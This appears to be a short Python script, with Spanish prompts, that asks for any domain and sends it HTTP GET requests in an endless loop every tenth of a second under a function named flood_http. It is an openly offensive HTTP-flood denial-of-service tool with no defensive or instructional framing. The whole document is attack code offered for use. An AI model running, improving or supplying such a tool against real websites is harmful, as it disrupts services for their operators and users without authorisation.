import requests
import time

def flood_http(domain):
    while True:
        response = requests.get(f"http://{domain}")
        print(f"Enviamos solicitud GET {domain}. Codigo status: {response.status_code}")
        time.sleep(0.1)

if __name__ == "__main__":
    domain = input("Introduce el domminio (sin 'http://'): ")
    flood_http(domain)
